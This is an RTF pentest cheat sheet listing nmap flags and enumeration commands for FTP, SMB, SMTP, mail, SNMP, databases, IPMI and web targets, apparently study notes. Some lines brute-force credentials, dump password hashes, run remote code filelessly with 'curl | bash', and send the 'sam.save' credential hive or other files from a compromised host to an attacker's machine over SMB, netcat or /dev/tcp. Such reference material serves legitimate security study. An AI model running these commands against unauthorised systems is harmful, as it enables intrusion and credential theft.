{\rtf1\ansi\ansicpg1252\cocoartf2639
\cocoatextscaling0\cocoaplatform0{\fonttbl\f0\fswiss\fcharset0 Helvetica-Bold;\f1\fswiss\fcharset0 Helvetica;\f2\fswiss\fcharset0 Helvetica-Oblique;
}
{\colortbl;\red255\green255\blue255;\red205\green165\blue255;\red205\green165\blue255;\red255\green245\blue73;
\red255\green245\blue73;\red255\green255\blue255;\red255\green255\blue162;\red25\green60\blue255;\red34\green255\blue6;
\red252\green90\blue64;\red252\green90\blue64;\red149\green149\blue149;\red255\green255\blue11;\red246\green255\blue27;
\red255\green255\blue37;\red255\green255\blue37;\red251\green0\blue7;\red253\green152\blue255;\red136\green255\blue255;
\red253\green147\blue203;\red252\green41\blue19;\red21\green93\blue255;\red123\green221\blue55;\red117\green117\blue117;
\red254\green184\blue25;\red254\green214\blue72;\red253\green139\blue9;\red251\green0\blue255;\red254\green204\blue255;
\red255\green255\blue162;\red196\green255\blue139;\red149\green149\blue149;\red252\green117\blue255;\red217\green148\blue77;
}
{\*\expandedcolortbl;;\cssrgb\c84274\c72166\c100000;\cssrgb\c84274\c72166\c100000;\cssrgb\c100000\c95847\c35374;
\cssrgb\c100000\c95847\c35374;\cssrgb\c100000\c100000\c100000\c0;\cssrgb\c100000\c100000\c69339;\cssrgb\c12594\c35385\c100000;\cssrgb\c0\c100000\c0;
\cssrgb\c100000\c44604\c31621;\cssrgb\c100000\c44604\c31621;\cssrgb\c65058\c65058\c65058;\cssrgb\c100000\c100000\c0;\cssrgb\c97054\c100000\c12397;
\cssrgb\c100000\c100000\c18056;\cssrgb\c100000\c100000\c18056;\cssrgb\c100000\c12195\c0;\cssrgb\c100000\c68393\c100000;\cssrgb\c59016\c100000\c100000;
\cssrgb\c100000\c66049\c83523;\cssrgb\c100000\c25745\c7993;\cssrgb\c8872\c47049\c100000;\cssrgb\c54133\c87606\c27652;\cssrgb\c53231\c53231\c53231;
\cssrgb\c100000\c76466\c11633;\cssrgb\c100000\c86042\c35001;\cssrgb\c100000\c61456\c0;\cssrgb\c100000\c7248\c100000;\cssrgb\c100000\c84540\c100000;
\cssrgb\c100000\c100000\c69339;\cssrgb\c80504\c100000\c61376;\cssrgb\c65058\c65058\c65058;\cssrgb\c100000\c56882\c100000;\cssrgb\c88569\c64418\c37353;
}
\margl1440\margr1440\vieww25400\viewh16000\viewkind0
\pard\tx720\tx1440\tx2160\tx2880\tx3600\tx4320\tx5040\tx5760\tx6480\tx7200\tx7920\tx8640\pardirnatural\partightenfactor0

\f0\b\fs28 \cf0 VPN Connect
\f1\b0 :\
\'a7 sudo openvpn $keyfile								:connect to network\
\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97
\f0\b \
Banner grab
\f1\b0 : \
--source-port $port									:performs the scans from specified source port\
\'a7 nc $ip $port										:normal\
\'a7 nc -nv $ip $port									:version\
\'a7 nmap -sV --script=banner $ip\
\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\

\f0\b Netcat
\f1\b0 :\
\'a7 nc $ip $port										:normal\
\'a7 nc -nv $ip $port									:version\
\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\

\f0\b Telnet
\f1\b0 :\
\'a7 telnet $ip $port										:interact with service\
\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\

\f0\b Nmap
\f1\b0 :\
Windows usually has TTL of 128 from ping\
-sC 												:used default nmap scripts for more detailed information\
-sV												:version\
-F												:scan top 100 ports\
-S												:manually specify the source IP address\
-e tun0											:sends all requests through the specified interface\
-sS												:SYN scan\
-n												:no DNS resolution\
-sT												:TCP scan\
-sA												:ACK scan\
-sU												:UDP scan\
-oN												:save file normally\
-oG												:save file as grapable output\
-oX												:save file as XML\
-oA												:save file in all formats\
-vv 												:show us open ports directly when detected\
-iL $file											:hosts in a file you want to scan\
-sn												:no port scan\
-PE												:uses ping to scan\
-Pn												:no ping (ICMP) assume host is up\
-D RND:5											:decoy scan that generates 5 random IP\'92s disguised the origin\
--source-port $port									:performs the scans from specified source port\
--top-ports=10										:scan top 10 ports\
--packet-trace										:shows all packets sent and received\
--disable-arp-ping									:disables ARP and forces ICMP\
--reason											:displays the reason for specific result (eg: Host is up, received arp-response)\
--script=http-enum									:enumerate common web application directories\
--stats-every=5s										:shows the progress of the scan every 5 seconds.\
\'a7 nmap --script $scriptname -p $port $ip						:use Nmap script\
\'a7 nmap --script smb-os-discovery.nse -p 445 $ip				:get OS version\
\'a7 nmap -v -oG -										:show which are the top 1000 ports\
\'a7 nmap -sV --open -oA $outfile $ip							:scan top 1000, put contents into output file, output only open ports\'92 versions\
\'a7 sudo nmap $cidr -sn -oA $out | grep for | cut -d" " -f5			:see which hosts are up in subnet\
\'a7 sudo nmap $ip -sn -oA $out -PE --packet-trace				:see if single host is up or not\
\'a7 xsltproc $target.xml -o $target.html						:convert XML output to HTML page\
\'a7 \
\'a7 \
NetBIOS name = hostname\
\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\

\f0\b FTP
\f1\b0 :\
\'a7 ftp $ip											:connect to FTP service via active mode\
\'a7 ftp -p $ip 											:connect to FTP service via passive mode\
\'a7 wget -m --no-passive ftp://anonymous:anonymous@$ip			:download all files on server at once\
\'a7 openssl s_client -connect $ip:21 -starttls ftp					:connection if the FTP server runs with TLS encryption\
\cb2 \'a7 \cb1 sudo pip3 install pyftpdlib								:installing the FTP Server Python3 Module - pyftpdlib\
\cb2 \'a7 \cb1 sudo python3 -m pyftpdlib --port 21						:setting up a Python3 FTP Server and putting port as 21 \
\pard\tx720\tx1440\tx2160\tx2880\tx3600\tx4320\tx5040\tx5760\tx6480\tx7200\tx7920\tx8640\pardirnatural\partightenfactor0
\cf0 \cb3 \'a7 \cb1 sudo python3 -m pyftpdlib --port 21 --write					:allow clients to upload files to our attack host\
   \cb2 C:>\cb1  (New-Object Net.WebClient).DownloadFile('ftp://$ip/file.txt', 'ftp-file.txt')            (download Files from an FTP Server Using PowerShell)\
   \cb3 C:> \cb1 (New-Object Net.WebClient).UploadFile('ftp://$ip/ftp-hosts', 'C:$pathtofile\'92)       (PowerShell Upload File) \
ftp> get $file										:download file\
ftp> put $file										:upload files in the current folder to the FTP server\
ftp> ls											:list files\
ftp> status											:get overview of the server's settings\
ftp> ls -R											:see all the visible content at once\
ftp> exit											\
\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\
\pard\tx720\tx1440\tx2160\tx2880\tx3600\tx4320\tx5040\tx5760\tx6480\tx7200\tx7920\tx8640\pardirnatural\partightenfactor0

\f0\b \cf0 NFS
\f1\b0 :\
ports 111, 2049\
\'a7 sudo nmap $ip -p111,2049 -sV -sC						:scans NFS ports for information, checks RPC services\
\'a7 sudo nmap --script nfs* $ip -sV -p111,2049					:uses NFS specific nmap scripts\
\'a7 showmount -e $ip									:shows available NFS shares\
    \'a7 mkdir $dirname\
    \'a7 sudo mount -t nfs $ip:/ ./$dirname/ -o nolock				:mounting NFS share\
    \'a7 cd $dirname\
\'a7 sudo umount ./$dirname								:unmounting share from your system\
\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\

\f0\b SMB/Samba
\f1\b0 :\
\'a7 sudo systemctl restart smbd							:restart service after config changes in /etc/samba/smb.conf\
\'a7 sudo nmap $ip -sV -sC -p139,445						:NSE scripts that can help us examine the target's SMB service more closely\
\'a7 nmap --script smb-os-discovery.nse -p445 $ip				:get OS version\
\'a7 smbclient -L $ip -U $user								:connect to the share\
\'a7 smbclient -N -L \\\\\\\\$ip									:-L specifies we want to retrieve list of shares, -N suppresses password prompt\
\'a7 smbclient \\\\\\\\$ip\\\\$share								:connect to specified share\
\'a7 smbclient //$ip/$share								:connect to specified share\
\'a7 smbclient -U $username \\\\\\\\$ip\\\\$share					:connect as user to share\
\'a7 sudo mount -t cifs -o username=$user,password=$pass //$ip/\'93Sharename\'94 /$mountodir              (mounting to the Share, sudo apt-get install cifs-utils (if error))\
\'a7 rpcclient -U "" $ip									:anonymous log in to remote computer with RPC\
	rpcclient> netshareenumall							:enumerates all available shares\
	rpcclient> netsharegetinfo $share						:provides information about a specific share\
	rpcclient> enumdomusers							:enumerates all domain users\
	rpcclient> queryuser $RID							:provides information about a specific user\
	rpcclient> querygroup $RID							:retrieve information from the entire group\
\'a7 smbmap -H $ip										:smb enumeration\
\'a7 crackmapexec smb $ip --shares -u '' -p ''					:smb enumeration \
   \'a7 git clone https://github.com/cddmp/enum4linux-ng.git\
   \'a7 cd enum4linux-ng									:another smb enumeration script\
   \'a7 pip3 install -r requirements.txt\
   \'a7 ./enum4linux-ng.py $ip -A\
\cb4 \'a7 \cb1 sudo impacket-smbserver share -smb2support /tmp/smbshare	:start smb server locally to download files from\
\cb4 \'a7 \cb1 sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test                (start smb server locally to download files from with username and pass(do if auth error))\
   \cb4 C:>\cb1  copy \\\\$ip\\share\\nc.exe							:copy a File from the SMB Server on Windows\
   \cb5 C:>\cb6  \cb1 copy C:\\path\\to\\file \\\\$ip\\share						:upload a file from Windows to SMB server on Linux\
   \cb4 C:>\cb1  net use n: \\\\192.168.220.133\\share /user:test test			:mount the SMB Server with Username and Password\
\cb7 \'a7 \cb1 sudo python3 smbserver.py -smb2support CompData /home/Documents/                     (creating a Share on attack box so target can send files)\
   \cb7 C:>\cb1  move sam.save \\\\$ip\\CompData						                              (move files from target to attack box by specifying share)\
C:> net share										:check the shares we created\
smb> get $file										:download file\
smb> ls											:list files\
smb> !<cmd>										:allows execution of shell commands outside scope of SMB commands but supported by underlying shell\
\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\

\f0\b SMTP
\f1\b0 :\
ports 25, 587, 465\
\'a7 telnet $ip 25										:initialize a TCP connection with the SMTP server\
   > HELO||EHLO $computername							:log in with computer name and starts session\
   > VRFY $name										:can be used to enumerate existing users (not always reliable)\
\'a7 CONNECT $ip:25 HTTP/1.0							:make web proxy connect to SMTP server\
\'a7 sudo nmap $ip -sC -sV -p25							:include smtp-commands which lists all possible commands that can be executed on SMTP server\
\'a7 sudo nmap $ip -p25 --script smtp-open-relay -v				:identify target SMTP server as an open relay\
\'a7 smtp-user-enum -M VRFY -U $wordlist -t $ip					:see which users exits from word list on SMTP server\
\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\

\f0\b IMAP/POP3
\f1\b0 :\
ports 110, 143, 993, 995\
\'a7 sudo nmap $ip -sV -p110,143,993,995 -sC			:gives information about services like CNAME\
\'a7 curl -k 'imaps://$ip' --user $user:$password			:non-SSL login access to mail server (-v to see TLS version, details of SSL certificate, and banner)\
\'a7 openssl s_client -connect $ip:pop3s				:interact with POP3 server over SSL\
\'a7 openssl s_client -connect $ip:imaps				:interact with IMAP server over SSL\
            POP3 commands\
    > USER username							:identifies the user\
    > PASS password							:authentication of the user using its password\
    > STAT									:requests the number of saved emails from the server\
    > LIST									:requests from the server the number and size of all emails\
    > RETR id								:requests the server to deliver the requested email by ID\
    > DELE id								:requests the server to delete the requested email by ID\
    > CAPA									:requests the server to display the server capabilities\
    > RSET									:requests the server to reset the transmitted information\
    > QUIT									:closes the connection with the POP3 server\
            IMAP commands\
    > 1 LOGIN username password					:user's login\
    > 1 LIST "" *								:lists all directories\
    > 1 CREATE "INBOX"						:creates a mailbox with a specified name\
    > 1 DELETE "INBOX"						:deletes a mailbox\
    > 1 RENAME "ToRead" "Important"				:renames a mailbox\
    > 1 LSUB "" *								:returns a subset of names from the set of names that the User has declared as being active or subscribed\
    > 1 SELECT INBOX							:selects a mailbox so that messages in the mailbox can be accessed\
    > 1 UNSELECT INBOX						:exits the selected mailbox\
    > 1 FETCH 1:* all							:retrieves data associated with a message in the mailbox\
    > 1 FETCH 1:* (body[])						:retrieves data associated with a message in the mailbox\
    > 1 CLOSE								:removes all messages with the Deleted flag set\
    > 1 LOGOUT								:closes the connection with the IMAP server\
\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\

\f0\b SNMP
\f1\b0 :\
UDP port 161 and 162\
\'a7 snmpwalk -v 2c -c $communitystring $ip $OID				:get SNMP information/statistics about router or device\
\'a7 onesixtyone -c $file $ip								:brute force community string\
\'a7 braa $communitystring@$ip:.1.3.6.*						:brute-force the individual OIDs\
\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\

\f0\b Web Enum
\f1\b0 :\
domain.glass										:tell us a lot about company's infrastructure\
sitereport.netcraft.com\
archive.org/web										:waybackmachine\
\'a7 gobuster dir -u $url -w $wordlist							:check if directory exists\
\'a7 gobuster dns -d $url -w $wordlist							:check if subdomain exists\
\'a7 whatweb $url/ip									:extract web server version, can also use CIDR\
\'a7 whatweb -a3 $domain -v								:aggression level of 3 and verbose output\
\'a7 wafw00f -v $domain									:-a checks all possible WAFs instead of stopping at first match, input file of domains via the -i, proxy requests -p\
\'a7 cat $file | aquatone -out ./$dir -screenshot-timeout 1000			:sees attack surfaces, visits website with headless Chrome browser, takes screenshots\
\'a7 $command | xmllint  --format -							:prettify XML output\
\'a7 whois $ip/domain									:domain\'92s contact information, the domain's creation, and expiration dates\
\'a7 nslookup $ip/domain									:general query\
\'a7 nslookup -type=NS $domain							:identifying name servers\
\'a7 nslookup -type=any -query=AXFR $domain $nsIP				:perform the Zone transfer. Testing for ANY and AXFR Zone Transfer\
\'a7 nslookup -query=A $ip/domain							:querying: A Records for a Subdomain\
\'a7 nslookup -query=PTR $ip								:get PTR Records for an IP Address\
\'a7 nslookup -query=TXT $ip/domain						:get TXT Records\
\'a7 nslookup -query=MX $ip/domain							:get MX records\
\'a7 dig $ip/domain @$ip									:shows some DNS info\
\'a7 dig a $domain @$server								:querying: A Records for a Subdomain\
\'a7 dig -x $ip @$server									:get PTR Records for an IP Address\
\'a7 dig txt $domain @$server								:get TXT Records\
\'a7 dig mx $domain @$server								:get MX records\
\'a7 curl -s http://$ip -H "Host: $domain\'94						:name-based Virtual Hosting\
\'a7 ffuf -w ./$file -u http://$ip -H "HOST: FUZZ.$domain" -fs 612		:vHost Fuzzing for subdomains and filters based on response size of 612\
\'a7 ffuf -recursion -recursion-depth 1 -u http://$ip/domain/FUZZ -w $file	:recursively discover files and folders\
\'a7 cewl -m5 --lowercase -w $wordlist.txt http://$ip/domain			:extract keywords from the website and put in file\
\'a7 ffuf -w ./folders.txt:FOLDERS,./wordlist.txt:WORDLIST,./extensions.txt:EXTENSIONS -u http://$ip/domain/FOLDERS/WORDLISTEXTENSIONS          (search for files)\
\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\

\f0\b MYSQL
\f1\b0 :\
port 3306\
\'a7 sudo nmap $ip -sV -sC -p3306 --script mysql*				:scans using nmap\
\'a7 mysql -u $user -p$password -h $ip						:interact with mysql\
mysql> show databases;								:show all databases.\
use <database>;										:select one of the existing databases.\
show tables;										:show all available tables in the selected database.\
show columns from <table>;								:show all columns in the selected database.\
select * from <table>;									:show everything in the desired table.\
select * from <table> where <column> = "<string>";				:search for needed string in the desired table.
\f0\b \

\f1\b0 \'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\

\f0\b MSSQL
\f1\b0 :\
port 1433\
\'a7 sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 $ip\
msf6> auxiliary(scanner/mssql/mssql_ping)\
\'a7 python3 mssqlclient.py $user@$ip -windows-auth				:interact with mssql if credentials are known\
\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97
\f0\b \
Oracle TNS
\f1\b0 :\
\'a7 sudo nmap -p1521 -sV $ip --open						:scan the default Oracle TNS listener port\
\'a7 sudo nmap -p1521 -sV $ip --open --script oracle-sid-brute		:SID Bruteforcing\
\'a7 ./odat.py all -s $ip									:enumerate about database names, versions, processes, accounts, vulnerabilities, misconfigurations\
./odat.py utlfile -s $ip -d XE -U $user -P $pass --sysdba --putFile C:\\\\inetpub\\\\wwwroot testing.txt ./testing.txt                   (file upload to web server attempt)\
\'a7 sqlplus $user/$pass@$ip/XE;							:connect to the Oracle database and interact with it (XE is the SID)\
\'a7 sqlplus $user/$pass@$ip/XE; as sysdba					:connect as admin role with user\
sql> select table_name from all_tables;\
sql> select * from user_role_privs;\
sql> select name, password from sys.user$;					:extract password hashes
\f0\b \

\f1\b0 \'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\

\f0\b IPMI
\f1\b0 :\
\'a7 sudo nmap -sU --script ipmi-version -p 623 $ip				:footprint the service\
msf6 > use auxiliary/scanner/ipmi/ipmi_version\
msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes			:retrieve IPMI hashes\
\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97
\f0\b \
Git
\f1\b0 :\
\'a7 git clone $url										:clone repository locally\
\'a7 \
\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\

\f0\b cURL
\f1\b0 :\
\'a7 curl -IL $url										:-I for getting back HTTP response header, -L for automatically following any redirect\
\'a7 curl $url -o $file										:download a file\
\'a7 curl -k https://$domain								:skip certificate check with -k for applications without valid SSL certificate\
\'a7 curl -s https://crt.sh/\\?q\\=$domain\\&output\\=json | jq .			:shows logs of all digital certificates issued of domain\
\'a7 curl -s https://crt.sh/\\?q\\=$domain\\&output\\=json | jq . | grep name | cut -d":" -f2 | grep -v "CN=" | cut -d'"' -f2 | awk '\{gsub(/\\\\n/,"\\n");\}1;' | sort -u            (outputs only unique subdomains)\
\'a7 curl -s http://$ip -H "Host: $domain\'94						:name-based Virtual Hosting\
\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\

\f0\b Privesc
\f1\b0 :\
https://gtfobins.github.io/								:for linux\
https://lolbas-project.github.io/							:for windows\
\'a7 sudo su -											:switch to root\
\'a7 sudo -l											:check user privileges \
\'a7 sudo -u $user $/command								:sudo as specific user if we have permission\
\'a7 \
\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\

\f0\b Linux
\f1\b0 :\
\'a7 grep -v $word										:show output except for keyword\
\'a7 wget $url -O $destpath								:download a file and put it into file on local machine\
\'a7 wget -qO- $URL.py | python3							:run a python file from the internet in memory (fileless)\
\'a7 curl $url -o $file										:download a file\
\'a7 curl $URL | bash									:fileless Download with cURL\
\'a7 find / -type f -name \'93$file\'94								:search for location of file\
\'a7 find / -type d -name \'93$directory"							:search for location of directory\
\'a7 find / -type f -name ftp* 2>/dev/null | grep scripts				:finds all NSE scripts for FTP\
\'a7 ssh $user@$ip -i $keyfile -p $port						:log in with ssh using key\
\'a7 ssh-keygen -f $keyname								:creates ssh keys (keyname and keyname.pub), and can be stored at /home/user/.ssh/authorized_keys\
\'a7 scp $user@$ip:/$savefrom /$saveto/						:get file from remote to local\
\'a7 scp /$exportfrom $user@$ip:/$exportto/					:copy file from local to remote\
\'a7 md5sum $file										:get MD5 hash of file\
\'a7 cat $file | base64 -w 0;echo							:encodes file to base64\
\'a7 echo \'93$base64string\'94 | base64 -d > $file					:decode base 64 string and puts into file\
\'a7 file $file											:check file type\
\'a7 sudo tcpdump -i $interface host $ip1 and $ip2				:capture network traffic and filters traffic based on two IP\'92s\
\'a7 dig any $domain 									:retrieves all available DNS info for domain like A, AAAA, CNAME, MX, NS, TXT, SOA\
\'a7 gunzip -S .zip $zipfile									:decompresses zip file\
\'a7 unzip $file										:unzip a file\
\'a7 \
\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\

\f0\b Downloading and Uploading
\f1\b0 :\
https://gtfobins.github.io/								:for linux\
https://lolbas-project.github.io/							:for windows\
\
\cb8 \'a7 \cb1 nc -l -p $port > $file									:NetCat listen on Compromised Machine, redirect stdout using > followed by the filename\
\cb8 \'a7 \cb1 nc -q 0 $ip $port < $file								:NetCat command to send the contents of a file on attack box to a listening target\
\cb9 \'a7 \cb1 ncat -l -p $port --recv-only > $file							:Ncat listen on Compromised Machine, --recv-only to close connection once file transfer finished\
\cb9 \'a7 \cb1 ncat --send-only $ip $port < $file							:Ncat command to send the contents of a file on attack box to a listening target\
\cb10 \'a7 \cb1 sudo nc -l -p 443 -q 0 < $file							:Netcat command, where attack box is listening on 443 and redirects input from the file to netcat command  \
\cb10 \'a7 \cb1 nc $ip 443 > $file									:netcat where compromised box connects to attack and downloads file\
\pard\tx720\tx1440\tx2160\tx2880\tx3600\tx4320\tx5040\tx5760\tx6480\tx7200\tx7920\tx8640\pardirnatural\partightenfactor0
\cf0 \cb11 \'a7 \cb1 cat < /dev/tcp/$ip/443 > $file							:using Bash /dev/tcp to Receive File from attackers netcat listening port\
